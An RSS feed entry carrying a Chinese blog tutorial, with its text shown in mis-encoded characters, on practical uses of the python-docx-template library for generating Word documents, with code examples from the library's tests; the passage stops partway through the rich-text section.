{
  "title": "ä¸»é¡µ - åšå®¢å›­",
  "link": "https://www.cnblogs.com/",
  "description": "ä¸»é¡µ - åšå®¢å›­ RSS",
  "entries": [
    {
      "title": "[python] python-docx-templateå®ç”¨æ¡ˆä¾‹è§£æ",
      "link": "https://www.cnblogs.com/luohenyueji/p/19556736",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/luohenyueji/p/19556736\" id=\"cb_post_title_url\" title=\"å‘å¸ƒäº 2026-01-31 09:17\">\n    <span>[python] python-docx-templateå®ç”¨æ¡ˆä¾‹è§£æ</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>Python-docx-templateæ˜¯ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§çš„Wordæ–‡æ¡£è‡ªåŠ¨åŒ–ç”Ÿæˆåº“ï¼Œå®ƒåŸºäºæ¨¡æ¿å¼•æ“çš„è®¾è®¡æ€æƒ³ï¼Œå…è®¸ç”¨æˆ·é€šè¿‡ç¼–å†™æ¨¡æ¿ä¸Pythonä»£ç é€»è¾‘åˆ†ç¦»çš„æ–¹å¼ï¼Œé«˜æ•ˆç”Ÿæˆç»“æ„å¤æ‚ã€æ ·å¼å¤šæ ·çš„Wordæ–‡æ¡£ã€‚åœ¨æ–‡ç« <a href=\"https://www.cnblogs.com/luohenyueji/p/19503461\" target=\"_blank\">python-docx-templateæ¨¡æ¿åŒ–Wordæ–‡æ¡£ç”ŸæˆæŒ‡åŒ—</a>ä»‹ç»è¯¥åº“çš„åŸºç¡€ç”¨æ³•ä¹‹ä¸Šï¼Œæœ¬æ–‡å°†è¿›ä¸€æ­¥ç»“åˆå®˜æ–¹ç¤ºä¾‹ï¼Œæä¾›å¤šä¸ªå®ç”¨åœºæ™¯çš„ä»£ç è§£æä¸æ‹“å±•ï¼Œæ¶µç›–å¤æ‚æ ·å¼ã€è‡ªå®šä¹‰è¿‡æ»¤å™¨ã€åµŒå¥—å¾ªç¯åŠå¯Œæ–‡æœ¬æ¸²æŸ“ç­‰é«˜çº§åŠŸèƒ½ï¼Œä»¥æå‡æ–‡æ¡£ç”Ÿæˆçš„æ•ˆç‡ä¸çµæ´»æ€§ã€‚ä¸‹æ–‡å°†åˆ†æ¨¡å—å±•å¼€å…·ä½“ç¤ºä¾‹ä¸å®ç°ã€‚</p>\n<p>python-docx-templateçš„å®˜æ–¹ä»£ç ä»“åº“åœ°å€ä¸ºï¼š<a href=\"https://github.com/elapouya/python-docx-template\" rel=\"noopener nofollow\" target=\"_blank\">python-docx-template</a>ï¼Œè¯¦ç»†æ–‡æ¡£å¯å‚é˜…ï¼š<a href=\"https://docxtpl.readthedocs.io/\" rel=\"noopener nofollow\" target=\"_blank\">python-docx-template doc</a>ã€‚</p>\n<p><img alt=\"\" src=\"https://gitlab.com/luohenyueji/article_picture_warehouse/-/raw/main/CSDN/%5Bpython%5D%20python-docx-template%E5%AE%9E%E7%94%A8%E6%A1%88%E4%BE%8B%E8%A7%A3%E6%9E%90/imgs/img1.png\" /></p>\n<p>æœ¬æ–‡ä½¿ç”¨çš„python-docx-templateç‰ˆæœ¬ä¸º0.20.2ï¼Œå®‰è£…å‘½ä»¤å¦‚ä¸‹ï¼š</p>\n<blockquote>\n<p>pip install docxtpl</p>\n</blockquote>\n<p></p><div class=\"toc\"><div class=\"toc-container-header\">ç›®å½•</div><ul><li><a href=\"#1-å®ç”¨æ¡ˆä¾‹\" rel=\"noopener nofollow\">1 å®ç”¨æ¡ˆä¾‹</a><ul><li><a href=\"#11-è¡¨æ ¼æ ·å¼ç”Ÿæˆ\" rel=\"noopener nofollow\">1.1 è¡¨æ ¼æ ·å¼ç”Ÿæˆ</a></li><li><a href=\"#12-è‡ªå®šä¹‰jinja2è¿‡æ»¤å™¨\" rel=\"noopener nofollow\">1.2 è‡ªå®šä¹‰Jinja2è¿‡æ»¤å™¨</a></li><li><a href=\"#13-æ–‡æ¡£åµŒå…¥\" rel=\"noopener nofollow\">1.3 æ–‡æ¡£åµŒå…¥</a></li><li><a href=\"#14-è‡ªåŠ¨è½¬ä¹‰\" rel=\"noopener nofollow\">1.4 è‡ªåŠ¨è½¬ä¹‰</a></li><li><a href=\"#15-å›¾ç‰‡æ›¿æ¢\" rel=\"noopener nofollow\">1.5 å›¾ç‰‡æ›¿æ¢</a></li><li><a href=\"#16-å‘½ä»¤è¡Œæ‰§è¡Œ\" rel=\"noopener nofollow\">1.6 å‘½ä»¤è¡Œæ‰§è¡Œ</a></li><li><a href=\"#17-å¤šå±‚åµŒå¥—\" rel=\"noopener nofollow\">1.7 å¤šå±‚åµŒå¥—</a></li><li><a href=\"#18-åœ°åŒºå­—ä½“å¤„ç†\" rel=\"noopener nofollow\">1.8 åœ°åŒºå­—ä½“å¤„ç†</a></li><li><a href=\"#19-å¯Œæ–‡æœ¬ä½¿ç”¨\" rel=\"noopener nofollow\">1.9 å¯Œæ–‡æœ¬ä½¿ç”¨</a></li><li><a href=\"#110-é”™è¯¯ç®¡ç†\" rel=\"noopener nofollow\">1.10 é”™è¯¯ç®¡ç†</a></li></ul></li><li><a href=\"#2-å‚è€ƒ\" rel=\"noopener nofollow\">2 å‚è€ƒ</a></li></ul></div><p></p>\n<h1 id=\"1-å®ç”¨æ¡ˆä¾‹\">1 å®ç”¨æ¡ˆä¾‹</h1>\n<h2 id=\"11-è¡¨æ ¼æ ·å¼ç”Ÿæˆ\">1.1 è¡¨æ ¼æ ·å¼ç”Ÿæˆ</h2>\n<p>æœ¬ç¤ºä¾‹ç”¨äºç”ŸæˆåŒ…å«å¯Œæ–‡æœ¬æ ·å¼ä¸å•å…ƒæ ¼èƒŒæ™¯è‰²çš„Wordè¡¨æ ¼æ–‡æ¡£ã€‚</p>\n<p>æ¨¡æ¿å†…å®¹ï¼š</p>\n<p><img alt=\"\" src=\"https://gitlab.com/luohenyueji/article_picture_warehouse/-/raw/main/CSDN/%5Bpython%5D%20python-docx-template%E5%AE%9E%E7%94%A8%E6%A1%88%E4%BE%8B%E8%A7%A3%E6%9E%90/imgs/image.png\" /></p>\n<p>æ¸²æŸ“ä»£ç ï¼š</p>\n<pre><code class=\"language-python\"># python-docx-template/blob/master/tests/comments.py\nfrom docxtpl import DocxTemplate, RichText\n# data: python-docx-template/blob/master/tests/templates/cellbg_tpl.docx\ntpl = DocxTemplate(\"templates/cellbg_tpl.docx\")\n\ncontext = {\n    \"alerts\": [\n        {\n            \"date\": \"2015-03-10\",\n            \"desc\": RichText(\"Very critical alert\", color=\"FF0000\", bold=True),\n            \"type\": \"CRITICAL\",\n            \"bg\": \"FF0000\",\n        },\n        {\n            \"date\": \"2015-03-11\",\n            \"desc\": RichText(\"Just a warning\"),\n            \"type\": \"WARNING\",\n            \"bg\": \"FFDD00\",\n        }\n    ],\n}\n\ntpl.render(context)\ntpl.save(\"output/cellbg.docx\")\n</code></pre>\n<h2 id=\"12-è‡ªå®šä¹‰jinja2è¿‡æ»¤å™¨\">1.2 è‡ªå®šä¹‰Jinja2è¿‡æ»¤å™¨</h2>\n<p>æœ¬ç¤ºä¾‹ä¸»è¦ä»‹ç»é€šè¿‡è‡ªå®šä¹‰Jinja2è¿‡æ»¤å™¨å®ç°åŠ¨æ€æ•°æ®æ¸²æŸ“ï¼ŒJinja2æ¨¡æ¿ä¸­è¿‡æ»¤å™¨çš„æ ¸å¿ƒæ ¼å¼ä¸ºï¼š<code>{{ å˜é‡å|è¿‡æ»¤å™¨å(å‚æ•°1, å‚æ•°2, ...) }}</code>ï¼Œå…¶ä¸­ï¼š</p>\n<ul>\n<li><code>|</code>ï¼ˆç«–çº¿ï¼‰æ˜¯è¿‡æ»¤å™¨çš„åˆ†éš”ç¬¦ï¼Œå·¦ä¾§æ˜¯è¦å¤„ç†çš„å˜é‡ï¼Œå³ä¾§æ˜¯è¿‡æ»¤å™¨åç§°ï¼›</li>\n<li>æ‹¬å·<code>()</code>å†…æ˜¯ä¼ ç»™è¿‡æ»¤å™¨å‡½æ•°çš„å‚æ•°ï¼ˆæ— å‚æ•°æ—¶å¯çœç•¥æ‹¬å·ï¼‰ï¼›</li>\n<li>ç¤ºä¾‹ï¼š<code>{{ base_value_float|my_filterB(2) }}</code> ä¸­ï¼Œ<code>base_value_float</code>æ˜¯å˜é‡ï¼Œ<code>my_filterB</code>æ˜¯è¿‡æ»¤å™¨åï¼Œ<code>2</code>æ˜¯ä¼ é€’çš„å‚æ•°ã€‚</li>\n</ul>\n<p>æ¨¡æ¿å†…å®¹ï¼š</p>\n<p><img alt=\"\" src=\"https://gitlab.com/luohenyueji/article_picture_warehouse/-/raw/main/CSDN/%5Bpython%5D%20python-docx-template%E5%AE%9E%E7%94%A8%E6%A1%88%E4%BE%8B%E8%A7%A3%E6%9E%90/imgs/image-1.png\" /></p>\n<p>æ¸²æŸ“ä»£ç ï¼š</p>\n<pre><code class=\"language-python\"># python-docx-template/blob/master/tests/custom_jinja_filters.py\nfrom docxtpl import DocxTemplate\nimport jinja2\n\n# åˆ›å»ºjinja2ç¯å¢ƒå¯¹è±¡ï¼Œç”¨äºç®¡ç†æ¨¡æ¿æ¸²æŸ“çš„é…ç½®\njinja_env = jinja2.Environment()\n\n# è‡ªå®šä¹‰è¿‡æ»¤å™¨å‡½æ•°\ndef my_filterA(value, my_string_arg):\n    # å°†åŸå§‹å€¼å’Œå‚æ•°å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œä¸­é—´åŠ ç©ºæ ¼\n    return_value = value + \" \" + my_string_arg\n    return return_value\ndef my_filterB(value, my_float_arg):\n    # å°†åŸå§‹å€¼å’Œå‚æ•°æ•°å€¼ç›¸åŠ \n    return_value = value + my_float_arg\n    return return_value\n\n# å°†è‡ªå®šä¹‰è¿‡æ»¤å™¨æ³¨å†Œåˆ°jinja2ç¯å¢ƒä¸­ï¼Œä½¿å…¶èƒ½åœ¨æ¨¡æ¿ä¸­è¢«è°ƒç”¨\n# æ³¨å†Œååœ¨Wordæ¨¡æ¿ä¸­å¯é€šè¿‡{{ å˜é‡å| my_filterA('å‚æ•°') }}å½¢å¼ä½¿ç”¨\njinja_env.filters[\"my_filterA\"] = my_filterA\njinja_env.filters[\"my_filterB\"] = my_filterB\n\ncontext = {\n    \"base_value_string\": \" Hello\",  \n    \"base_value_float\": 1.5         \n}\n# data: python-docx-template/blob/master/tests/templates/custom_jinja_filters_tpl.docx\ntpl = DocxTemplate(\"templates/custom_jinja_filters_tpl.docx\")\ntpl.render(context, jinja_env)\ntpl.save(\"output/custom_jinja_filters.docx\")\n</code></pre>\n<h2 id=\"13-æ–‡æ¡£åµŒå…¥\">1.3 æ–‡æ¡£åµŒå…¥</h2>\n<p>ä»¥ä¸‹ä»£ç å±•ç¤ºäº†å¦‚ä½•æ¸²æŸ“å­Wordæ–‡æ¡£ï¼Œæ›¿æ¢ä¸»Wordæ–‡æ¡£ä¸­åµŒå…¥çš„å„ç±»æ–‡ä»¶ï¼Œå¡«å……æ•°æ®åä¿å­˜æ–‡æ¡£ï¼š</p>\n<pre><code class=\"language-python\"># python-docx-template/blob/master/tests/embedded.py\nfrom docxtpl import DocxTemplate\n\n# åŠ è½½å†…åµŒå­æ¨¡æ¿æ–‡ä»¶\n# data: python-docx-template/blob/master/tests/templates/embedded_embedded_docx_tpl.docx\nembedded_docx_tpl = DocxTemplate(\"templates/embedded_embedded_docx_tpl.docx\")\n\n# å®šä¹‰æ¨¡æ¿æ¸²æŸ“çš„ä¸Šä¸‹æ–‡æ•°æ®\ncontext = {\n    \"name\": \"John Doe\",  # è¦å¡«å……åˆ°æ¨¡æ¿ä¸­çš„å§“åå€¼\n}\nembedded_docx_tpl.render(context)\n\n# ä¿å­˜æ¸²æŸ“åçš„å­æ¨¡æ¿åˆ°æŒ‡å®šè·¯å¾„ï¼Œä¾›åç»­ä¸»æ¨¡æ¿è°ƒç”¨\nembedded_docx_tpl.save(\"output/embedded_embedded_docx.docx\")\n\n# åŠ è½½ä¸»æ¨¡æ¿æ–‡ä»¶\ntpl = DocxTemplate(\"templates/embedded_main_tpl.docx\")\n\n# å®šä¹‰ä¸»æ¨¡æ¿çš„ä¸Šä¸‹æ–‡æ•°æ®\ncontext = {\n    \"name\": \"John Doe\",\n}\n\n# æ›¿æ¢ä¸»æ¨¡æ¿ä¸­åµŒå…¥çš„Wordæ–‡æ¡£\n# å‚æ•°1ï¼šæ¨¡åŸæœ¬åµŒå…¥çš„å ä½æ–‡ä»¶è·¯å¾„\n# å‚æ•°2ï¼šè¦æ›¿æ¢æˆçš„ç›®æ ‡æ–‡ä»¶è·¯å¾„\ntpl.replace_embedded(\n    \"templates/embedded_dummy.docx\", \"templates/embedded_static_docx.docx\"\n)\n\ntpl.replace_embedded(\n    \"templates/embedded_dummy2.docx\", \"output/embedded_embedded_docx.docx\"\n)\n\n# è¯´æ˜ï¼šdocx æœ¬è´¨æ˜¯ zip å‹ç¼©åŒ…ï¼ŒåµŒå…¥çš„æ–‡ä»¶ä¼šå­˜å‚¨åœ¨word/embeddings/ç›®å½•ä¸‹\ntpl.replace_zipname(\n    \"word/embeddings/Feuille_Microsoft_Office_Excel3.xlsx\", \n    \"templates/real_Excel.xlsx\"  # è¦æ›¿æ¢æˆçš„å®é™…æ–‡ä»¶è·¯å¾„\n)\ntpl.replace_zipname(\n    \"word/embeddings/Pr_sentation_Microsoft_Office_PowerPoint4.pptx\",\n    \"templates/real_PowerPoint.pptx\" \n)\n\ntpl.render(context)\ntpl.save(\"output/embedded.docx\")\n</code></pre>\n<h2 id=\"14-è‡ªåŠ¨è½¬ä¹‰\">1.4 è‡ªåŠ¨è½¬ä¹‰</h2>\n<p>æœ¬ç¤ºä¾‹å±•ç¤ºäº†åœ¨è‡ªåŠ¨è½¬ä¹‰æ¨¡å¼ä¸‹ï¼Œå°†åŒ…å«XMLç‰¹æ®Šå­—ç¬¦ã€Unicodeæ–‡æœ¬å’ŒåŠ¨æ€é”®å€¼å¯¹çš„ä¸Šä¸‹æ–‡æ•°æ®æ¸²æŸ“åˆ°æ¨¡æ¿ä¸­ã€‚</p>\n<p>æ¨¡æ¿å†…å®¹ï¼š<br />\n<img alt=\"\" src=\"https://gitlab.com/luohenyueji/article_picture_warehouse/-/raw/main/CSDN/%5Bpython%5D%20python-docx-template%E5%AE%9E%E7%94%A8%E6%A1%88%E4%BE%8B%E8%A7%A3%E6%9E%90/imgs/image-2.png\" /></p>\n<p>æ¸²æŸ“ä»£ç ï¼š</p>\n<pre><code class=\"language-python\"># python-docx-template/blob/master/tests/escape_auto.py\nimport os\nfrom unicodedata import name\nfrom docxtpl import DocxTemplate\nXML_RESERVED = \"\"\"&lt;\"&amp;'&gt;\"\"\"\n# data: python-docx-template/blob/master/tests/templates/escape_tpl_auto.docx\ntpl = DocxTemplate(\"templates/escape_tpl_auto.docx\")\n\ncontext = {\n    \"nested_dict\": {name(str(c)): c for c in XML_RESERVED},\n    \"autoescape\": 'Escaped \"str &amp; ing\"!',\n    \"autoescape_unicode\": \"This is an escaped &lt;unicode&gt; example \\u4f60 &amp; \\u6211\",\n    \"iteritems\": lambda x: x.items(),\n}\n# autoescape=Trueè¡¨ç¤ºè‡ªåŠ¨è½¬ä¹‰\ntpl.render(context, autoescape=True)\n\nOUTPUT = \"output\"\nif not os.path.exists(OUTPUT):\n    os.makedirs(OUTPUT)\ntpl.save(OUTPUT + \"/escape_auto.docx\")\n</code></pre>\n<p>å®é™…ä¸Š<code>iteritems(nested_dict)</code>å°±æ˜¯è°ƒç”¨æ¸²æŸ“å®šä¹‰çš„lambdaå‡½æ•°ï¼ŒæŠŠnested_dictä¼ è¿›å»ï¼Œæ‹¿åˆ°å®ƒçš„æ‰€æœ‰é”®å€¼å¯¹ï¼š</p>\n<pre><code>{% for k, v in iteritems(nested_dict) %}\n{{ k.capitalize() }}: {{ v }}{% endfor %}\n</code></pre>\n<p>ä¹Ÿå¯ä»¥åœ¨Jinja2æ¨¡æ¿ä¸­ä½¿ç”¨Pythonè¡¨è¾¾å¼ï¼Œç›´æ¥è°ƒç”¨å­—å…¸çš„itemæ–¹æ³•ï¼š</p>\n<pre><code>{% for k, v in nested_dict.items() %}\n{{ k.capitalize() }}: {{ v }}{% endfor %}\n</code></pre>\n<h2 id=\"15-å›¾ç‰‡æ›¿æ¢\">1.5 å›¾ç‰‡æ›¿æ¢</h2>\n<p>ä»¥ä¸‹ç¤ºä¾‹è¯´æ˜å¦‚ä½•æ›¿æ¢Wordæ¨¡æ¿æ–‡æ¡£ï¼ˆåŒ…å«é¡µçœ‰é¡µè„šï¼‰ä¸­çš„å›¾ç‰‡ï¼Œå¹¶æ¼”ç¤ºå¦‚ä½•å°†å¤„ç†åçš„æ–‡æ¡£åˆ†åˆ«é€šè¿‡å¸¸è§„æ–¹å¼å’Œå†…å­˜æ–‡ä»¶å¯¹è±¡ä¿å­˜ä¸ºæœ¬åœ°æ–‡ä»¶ï¼š</p>\n<pre><code class=\"language-python\"># python-docx-template/blob/master/tests/header_footer_image_file_obj.py\nfrom docxtpl import DocxTemplate\nimport io\n\n# å®šä¹‰ä¸¤ä¸ªè¾“å‡ºæ–‡æ¡£çš„è·¯å¾„å’Œæ–‡ä»¶å\nDEST_FILE = \"output/header_footer_image_file_obj.docx\"\nDEST_FILE2 = \"output/header_footer_image_file_obj2.docx\"\n# data: python-docx-template/blob/master/tests/templates/header_footer_image_tpl.docx\ntpl = DocxTemplate(\"templates/header_footer_image_tpl.docx\")\n\ncontext = {\n    \"mycompany\": \"The World Wide company\",  \n}\n\n# è¯»å–æ¨¡æ¿ä¸­éœ€è¦è¢«æ›¿æ¢çš„å›¾ç‰‡æ–‡ä»¶ï¼Œå¹¶è½¬æ¢ä¸ºå†…å­˜å­—èŠ‚æµå¯¹è±¡\ndummy_pic = io.BytesIO(open(\"templates/dummy_pic_for_header.png\", \"rb\").read())\n# è¯»å–æ–°çš„æ›¿æ¢å›¾ç‰‡æ–‡ä»¶ï¼ˆpython.pngï¼‰ï¼Œå¹¶è½¬æ¢ä¸ºå†…å­˜å­—èŠ‚æµå¯¹è±¡\nnew_image = io.BytesIO(open(\"templates/python.png\", \"rb\").read())\n\n# å°†dummy_picå¯¹åº”çš„å›¾ç‰‡æ›¿æ¢ä¸ºnew_imageå¯¹åº”çš„å›¾ç‰‡\ntpl.replace_media(dummy_pic, new_image)\ntpl.render(context)\ntpl.save(DEST_FILE)\n\ntpl = DocxTemplate(\"templates/header_footer_image_tpl.docx\")\n\n# å°†å†…å­˜ä¸­çš„å›¾ç‰‡å­—èŠ‚æµæŒ‡é’ˆé‡ç½®åˆ°èµ·å§‹ä½ç½®\ndummy_pic.seek(0)\nnew_image.seek(0)\n\n# å†æ¬¡æ‰§è¡Œå›¾ç‰‡æ›¿æ¢æ“ä½œ\ntpl.replace_media(dummy_pic, new_image)\n# å†æ¬¡æ¸²æŸ“æ¨¡æ¿å˜é‡\ntpl.render(context)\n\n# åˆ›å»ºä¸€ä¸ªç©ºçš„å†…å­˜å­—èŠ‚æµå¯¹è±¡ï¼Œç”¨äºä¸´æ—¶å­˜å‚¨æ–‡æ¡£å†…å®¹\nfile_obj = io.BytesIO()\n# å°†å¤„ç†åçš„æ–‡æ¡£ä¿å­˜åˆ°å†…å­˜å­—èŠ‚æµå¯¹è±¡ä¸­\ntpl.save(file_obj)\n# å°†å†…å­˜å­—èŠ‚æµæŒ‡é’ˆé‡ç½®åˆ°èµ·å§‹ä½ç½®ï¼Œå‡†å¤‡è¯»å–å†…å®¹\nfile_obj.seek(0)\n\n# ä»¥äºŒè¿›åˆ¶å†™å…¥æ¨¡å¼æ‰“å¼€ç¬¬äºŒä¸ªè¾“å‡ºæ–‡ä»¶ï¼Œå°†å†…å­˜ä¸­çš„æ–‡æ¡£å†…å®¹å†™å…¥æ–‡ä»¶\nwith open(DEST_FILE2, \"wb\") as f:\n    f.write(file_obj.read())\ndummy_pic.close()\nnew_image.close()\n</code></pre>\n<p>ä¸Šè¿°ä»£ç å®ç°å›¾ç‰‡æ›¿æ¢å¹¶éåŸºäºæ–‡ä»¶åï¼Œè€Œæ˜¯åŸºäºäºŒè¿›åˆ¶å†…å®¹çš„åŒ¹é…ã€‚è¿™æ˜¯å› ä¸º<code>replace_media</code>æ–¹æ³•æ ¹æ®å›¾ç‰‡çš„äºŒè¿›åˆ¶å†…å®¹æ¥è¯†åˆ«å›¾åƒï¼Œè€Œéä¾èµ–æ–‡ä»¶åæˆ–åœ¨Wordä¸­æ˜¾ç¤ºçš„åç§°ã€‚<br />\nç”±äºWordæ–‡æ¡£ (.docx) æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œå…¶ä¸­çš„å›¾ç‰‡ä»¥äºŒè¿›åˆ¶å½¢å¼å­˜å‚¨åœ¨<code>word/media/</code>ç›®å½•ä¸‹ï¼Œä¸”åœ¨æŸäº›Wordç‰ˆæœ¬ä¸­ï¼Œå›¾ç‰‡æ–‡ä»¶åå¯èƒ½è¢«è‡ªåŠ¨é‡å‘½åï¼ˆä¾‹å¦‚æ”¹ä¸º <code>image1.png</code>ï¼‰ï¼Œä¸åŸå§‹æ–‡ä»¶åæ— å…³ã€‚</p>\n<p><strong>æ³¨æ„ğŸš€</strong>ï¼šå¾…æ›¿æ¢å›¾ç‰‡å°ºå¯¸ä¸å®œè¿‡å¤§ï¼Œä¸”éœ€å…³é—­Wordæ¨¡æ¿çš„å›¾ç‰‡å‹ç¼©åŠŸèƒ½ï¼›å¦åˆ™Wordä¼šè‡ªåŠ¨å‹ç¼©æ¨¡æ¿ä¸­çš„å›¾ç‰‡ï¼Œæ”¹å˜å…¶äºŒè¿›åˆ¶æ•°æ®ï¼Œæœ€ç»ˆå¯¼è‡´å›¾ç‰‡æ›¿æ¢æ“ä½œå¤±è´¥ã€‚</p>\n<h2 id=\"16-å‘½ä»¤è¡Œæ‰§è¡Œ\">1.6 å‘½ä»¤è¡Œæ‰§è¡Œ</h2>\n<p>ä»¥ä¸‹ç¤ºä¾‹å±•ç¤ºäº†ç›´æ¥åœ¨å‘½ä»¤è¡Œä¸­ä½¿ç”¨docxtplæ¨¡å—ï¼ŒåŸºäºæ¨¡æ¿æ–‡ä»¶å’Œä½œä¸ºä¸Šä¸‹æ–‡æ•°æ®çš„JSONæ–‡ä»¶ç”Ÿæˆdocxæ–‡æ¡£ï¼š</p>\n<pre><code class=\"language-python\"># python-docx-template/blob/master/tests/module_execute.py\nimport os\n# data: python-docx-template/blob/master/tests/templates/module_execute_tpl.docx\nTEMPLATE_PATH = \"templates/module_execute_tpl.docx\"\n# å­˜å‚¨éœ€è¦å¡«å……åˆ°æ¨¡æ¿ä¸­çš„æ•°æ®\nJSON_PATH = \"templates/module_execute.json\"\nOUTPUT_FILENAME = \"output/module_execute.docx\"\n# docxtplå‘½ä»¤å‚æ•°ï¼šå¼ºåˆ¶è¦†ç›–å·²å­˜åœ¨çš„è¾“å‡ºæ–‡ä»¶\nOVERWRITE = \"-o\"\n# docxtplå‘½ä»¤å‚æ•°ï¼šé™é»˜æ¨¡å¼æ‰§è¡Œï¼Œä¸è¾“å‡ºé¢å¤–æ—¥å¿—ä¿¡æ¯\nQUIET = \"-q\"\n # åˆ é™¤å·²å­˜åœ¨çš„è¾“å‡ºæ–‡ä»¶\nif os.path.exists(OUTPUT_FILENAME):\n    os.unlink(OUTPUT_FILENAME) \n\n# åˆ‡æ¢å·¥ä½œç›®å½•åˆ°å½“å‰è„šæœ¬æ‰€åœ¨çš„ç›®å½•\nos.chdir(os.path.dirname(__file__))\n\n# é€šè¿‡Pythonæ¨¡å—æ–¹å¼è°ƒç”¨docxtplï¼Œä¼ å…¥æ¨¡æ¿ã€æ•°æ®ã€è¾“å‡ºè·¯å¾„å’Œå‚æ•°\n# å¯é€šè¿‡python -m docxtpl -helpæŸ¥çœ‹è°ƒç”¨å¸®åŠ©\ncmd = \"python -m docxtpl %s %s %s %s %s\" % (\n    TEMPLATE_PATH,       # æ¨¡æ¿æ–‡ä»¶è·¯å¾„\n    JSON_PATH,           # æ•°æ®æ–‡ä»¶è·¯å¾„\n    OUTPUT_FILENAME,    # è¾“å‡ºæ–‡ä»¶è·¯å¾„\n    OVERWRITE,           # è¦†ç›–å‚æ•°\n    QUIET                # é™é»˜å‚æ•°\n)\n\nprint('Executing \"%s\" ...' % cmd)\nos.system(cmd)\nif os.path.exists(OUTPUT_FILENAME):\n    print(\"    --&gt; File %s has been generated.\" % OUTPUT_FILENAME)\n</code></pre>\n<h2 id=\"17-å¤šå±‚åµŒå¥—\">1.7 å¤šå±‚åµŒå¥—</h2>\n<p>ä»¥ä¸‹ç¤ºä¾‹å±•ç¤ºäº†å¦‚ä½•é€šè¿‡æ¨¡æ¿è¯­æ³•å®ç°é€å±‚å¾ªç¯æ¸²æŸ“ï¼Œæœ€ç»ˆç”ŸæˆåŒ…å«è¿™äº›åµŒå¥—æ•°æ®çš„Wordæ–‡æ¡£ï¼š</p>\n<pre><code class=\"language-python\"># python-docx-template/blob/master/tests/nested_for.py\nfrom docxtpl import DocxTemplate\n# data: python-docx-template/blob/master/tests/templates/nested_for_tpl.docx\ntpl = DocxTemplate(\"templates/nested_for_tpl.docx\")\n\ncontext = {\n    \"dishes\": [\n        {\"name\": \"Pizza\", \"ingredients\": [\"bread\", \"tomato\", \"ham\"]},\n        {\n            \"name\": \"Hamburger\",\n            \"ingredients\": [\"bread\", \"chopped steak\", \"cheese\"],\n        },\n    ],\n    \"authors\": [\n        {\n            \"name\": \"Saint-Exupery\",\n            \"books\": [\n                {\"title\": \"Le petit prince\"},\n                {\"title\": \"L'aviateur\"},\n            ],\n        },\n        {\n            \"name\": \"Barjavel\",\n            \"books\": [\n                {\"title\": \"Ravage\"},\n                {\"title\": \"La nuit des temps\"},\n            ],\n        },\n    ],\n}\n\ntpl.render(context)\ntpl.save(\"output/nested_for.docx\")\n</code></pre>\n<h2 id=\"18-åœ°åŒºå­—ä½“å¤„ç†\">1.8 åœ°åŒºå­—ä½“å¤„ç†</h2>\n<p>è‹¥å­—ä½“æ˜¾ç¤ºå¼‚å¸¸ï¼Œé€šå¸¸æ˜¯ç”±äºå­—ä½“ä»…é€‚é…äº†ç‰¹å®šæ–‡å­—åŒºåŸŸã€‚è§£å†³æ–¹æ³•æ˜¯åœ¨å­—ä½“åå‰åŠ ä¸ŠåŒºåŸŸæ ‡è¯†å’Œå†’å·ï¼ˆå¦‚ eastAsia:å¾®è½¯é›…é»‘ï¼‰ï¼Œä»è€ŒæŒ‡å®šæ–‡å­—çš„åŒºåŸŸæ¸²æŸ“æ–¹å¼ã€‚å¦‚æœä¸æ¸…æ¥šåŒºåŸŸæ ‡è¯†ï¼Œä¹Ÿå¯è§£å‹æ¨¡æ¿æ–‡ä»¶ååˆ†æ<code>document.xml</code>ç¡®è®¤å­—ä½“å¯¹åº”çš„åŒºåŸŸã€‚å¸¸è§åŒºåŸŸæ ‡è¯†åŒ…æ‹¬ï¼š</p>\n<ul>\n<li>eastAsiaï¼šç”¨äºä¸œäºšå­—ç¬¦å¦‚ä¸­æ–‡</li>\n<li>hAnsiï¼šç”¨äºæ‹‰ä¸å­—ç¬¦å¦‚è‹±æ–‡</li>\n<li>asciiï¼šç”¨äºå…¼å®¹æ—§ç‰ˆè‹±æ–‡</li>\n</ul>\n<p>ä»¥ä¸‹ä»£ç å±•ç¤ºäº†å¦‚ä½•è®¾ç½®ä¸åŒçš„ä¸œäºšå­—ä½“ï¼š</p>\n<pre><code class=\"language-python\"># python-docx-template/blob/master/tests/richtext_eastAsia.py\nfrom docxtpl import DocxTemplate, RichText\n# data: python-docx-template/blob/master/tests/templates/richtext_eastAsia_tpl.docx\ntpl = DocxTemplate(\"templates/richtext_eastAsia_tpl.docx\")\n# 2. åˆ›å»ºå¯Œæ–‡æœ¬å¯¹è±¡ï¼Œåˆ†åˆ«è®¾ç½®ä¸åŒçš„ä¸œäºšå­—ä½“\n# eastAsia: å‰ç¼€è¡¨ç¤ºè¯¥å­—ä½“è®¾ç½®ä»…ä½œç”¨äºä¸œäºšå­—ç¬¦ï¼ˆä¸­æ–‡ã€æ—¥æ–‡ã€éŸ©æ–‡ç­‰ï¼‰\nrt = RichText(\"æµ‹è¯•TEST\", font=\"eastAsia:Microsoft YaHei\")\nch = RichText(\"æµ‹è¯•TEST\", font=\"eastAsia:å¾®è½¯é›…é»‘\")\nsun = RichText(\"æµ‹è¯•TEST\", font=\"eastAsia:SimSun\")\ncontext = {\n    \"example\": rt,\n    \"Chinese\": ch,\n    \"simsun\": sun,\n}\n\ntpl.render(context)\ntpl.save(\"output/richtext_eastAsia.docx\")\n</code></pre>\n<h2 id=\"19-å¯Œæ–‡æœ¬ä½¿ç”¨\">1.9 å¯Œæ–‡æœ¬ä½¿ç”¨</h2>\n<p>Python-docx-templateçš„æ ¸å¿ƒåŠŸèƒ½æ˜¯åŸºäºJinja2è¯­æ³•åŠ¨æ€ç”ŸæˆWordæ–‡æ¡£ã€‚å…¶RichTextç±»è¿›ä¸€æ­¥å¢å¼ºäº†çµæ´»æ€§ï¼Œå…è®¸ç›´æ¥ä»¥ç¼–ç¨‹æ–¹å¼æ’å…¥æ ¼å¼ä¸°å¯Œçš„æ–‡æœ¬ï¼Œè€Œæ— éœ€ä¸ºæ¯ç§æ ·å¼ç»„åˆå•ç‹¬è®¾ç½®æ¨¡æ¿å˜é‡ã€‚RichTextå¯¹è±¡å¯åœ¨åˆå§‹åŒ–æ—¶ç›´æ¥ä¼ 